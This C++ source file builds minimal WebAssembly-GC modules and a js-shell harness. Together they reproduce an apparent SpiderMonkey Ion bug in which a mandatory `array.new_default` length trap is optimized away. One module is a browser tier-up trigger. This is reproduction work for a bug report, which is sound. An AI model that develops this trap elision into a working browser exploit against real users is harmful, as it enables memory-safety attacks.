// wasm_poc_builder.cpp — dependency-free builder for the SpiderMonkey Ion
// `array.new_default` trap-elision PoC modules.
//
// Emits the exact WebAssembly-GC binaries (no wat2wasm / GC-aware toolchain needed) and,
// if given a SpiderMonkey `js` shell path, drives the tier differential to show the bug.
//
// Build:  g++ -std=c++17 -O2 wasm_poc_builder.cpp -o wasm_poc_builder
// Emit :  ./wasm_poc_builder                 # writes module_a.wasm + module_b.wasm
// Prove:  ./wasm_poc_builder /path/to/js     # emits, then runs baseline vs optimizing
//
// The bytes are annotated so the report reader can see the module is minimal and that the
// single interesting opcode is `array.new_default` (0xFB 0x07) fed a -1 length (0x41 0x7F).
#include <cstdio>
#include <cstdlib>
#include <string>
#include <vector>

using Bytes = std::vector<unsigned char>;

// MODULE_A — the minimal shell repro:
//   (module (type (array (mut i32)))
//     (func (export "run") (result i32)
//       i32.const -1  array.new_default 0  drop  i32.const 42))
// baseline/V8 -> TRAP "too many array elements" ; Ion -> RES 42 (trap wrongly eliminated).
static Bytes moduleA() {
  return {
    0x00,0x61,0x73,0x6d, 0x01,0x00,0x00,0x00,          // \0asm, version 1
    // ---- Type section (id 1) ----
    0x01,0x08,0x02,                                     // id=1 len=8 count=2
      0x5e,0x7f,0x01,                                   //  type0: array (0x5e) of i32 (0x7f), mutable(1)
      0x60,0x00,0x01,0x7f,                              //  type1: func () -> (i32)
    // ---- Function section (id 3) ----
    0x03,0x02,0x01,0x01,                                // id=3 len=2 count=1 -> func0 uses type1
    // ---- Export section (id 7) ----
    0x07,0x07,0x01, 0x03,0x72,0x75,0x6e, 0x00,0x00,     // "run" (func 0)
    // ---- Code section (id 10) ----
    0x0a,0x0c,0x01, 0x0a,0x00,                          // id=10 len=12 count=1 ; body len=10, 0 locals
      0x41,0x7f,                                        //   i32.const -1  (length 0xFFFFFFFF)
      0xfb,0x07,0x00,                                   //   array.new_default type 0   <-- MUST trap
      0x1a,                                             //   drop        (result dead)
      0x41,0x2a,                                        //   i32.const 42
      0x0b                                              //   end
  };
}

// MODULE_B — browser tier-up PoC (conditional trap path so the function can be warmed up on
// a non-trapping path to reach Ion, then triggered):
//   (func (export "run") (param i32) (result i32)
//     (if (local.get 0) (then i32.const -1 array.new_default 0 drop))
//     i32.const 1 global.set 0  global.get 0)
static Bytes moduleB() {
  return {
    0x00,0x61,0x73,0x6d, 0x01,0x00,0x00,0x00,
    0x01,0x09,0x02, 0x5e,0x7f,0x01, 0x60,0x01,0x7f,0x01,0x7f, // types: array i32 mut ; (i32)->(i32)
    0x03,0x02,0x01,0x01,                                      // func0 : type1
    0x06,0x06,0x01, 0x7f,0x01, 0x41,0x00,0x0b,                // global0: mut i32 = 0
    0x07,0x07,0x01, 0x03,0x72,0x75,0x6e, 0x00,0x00,           // export "run"
    0x0a,0x15,0x01, 0x13,0x00,                                // code: body len 0x13, 0 locals
      0x20,0x00,                                              //   local.get 0 (param $t)
      0x04,0x40,                                              //   if (void)
        0x41,0x7f, 0xfb,0x07,0x00, 0x1a,                      //     i32.const -1 array.new_default 0 drop
      0x0b,                                                   //   end if
      0x41,0x01, 0x24,0x00,                                   //   i32.const 1  global.set 0
      0x23,0x00,                                              //   global.get 0
      0x0b                                                    //   end
  };
}

static void writeFile(const std::string& path, const Bytes& b) {
  FILE* f = std::fopen(path.c_str(), "wb");
  if (!f) { std::perror(("open " + path).c_str()); std::exit(1); }
  std::fwrite(b.data(), 1, b.size(), f); std::fclose(f);
  std::printf("wrote %-16s %zu bytes\n", path.c_str(), b.size());
}

// Minimal js-shell harness written next to the module: read module, instantiate, print token.
static const char* HARNESS =
  "var b=os.file.readFile(scriptArgs[0],'binary');"
  "var o;try{o='RES '+new WebAssembly.Instance(new WebAssembly.Module(b),{}).exports.run();}"
  "catch(e){o=(e instanceof WebAssembly.RuntimeError)?'TRAP':'ERR '+e;}print(o);";

static std::string runShell(const std::string& js, const std::string& flags,
                            const std::string& harnessPath, const std::string& modPath) {
  std::string cmd = js + " " + flags + " '" + harnessPath + "' '" + modPath + "' 2>&1";
  FILE* p = popen(cmd.c_str(), "r");
  if (!p) return "(popen failed)";
  std::string out; char buf[256];
  while (std::fgets(buf, sizeof buf, p)) out += buf;
  pclose(p);
  while (!out.empty() && (out.back()=='\n' || out.back()=='\r')) out.pop_back();
  return out.empty() ? "(no output)" : out;
}

int main(int argc, char** argv) {
  writeFile("module_a.wasm", moduleA());
  writeFile("module_b.wasm", moduleB());

  if (argc < 2) {
    std::printf("\nPoC modules written. To prove the miscompilation, pass a SpiderMonkey js shell:\n"
                "  ./wasm_poc_builder /path/to/js\n");
    return 0;
  }

  const std::string js = argv[1];
  const std::string harnessPath = "_anewd_harness.js";
  { FILE* f = std::fopen(harnessPath.c_str(), "wb"); std::fputs(HARNESS, f); std::fclose(f); }

  std::printf("\n=== differential on module_a.wasm ===\n");
  std::string base = runShell(js, "--wasm-compiler=baseline",   harnessPath, "module_a.wasm");
  std::string opt  = runShell(js, "--wasm-compiler=optimizing", harnessPath, "module_a.wasm");
  std::printf("  baseline   : %s   (expect TRAP)\n", base.c_str());
  std::printf("  optimizing : %s   (BUG if a value)\n", opt.c_str());
  bool bug = (base == "TRAP") && (opt.rfind("RES", 0) == 0);
  std::printf("\n  VERDICT: %s\n", bug ? "BUG REPRODUCED — Ion eliminated the mandatory trap."
                                       : "not reproduced on this build.");
  std::remove(harnessPath.c_str());
  return bug ? 0 : 1;
}
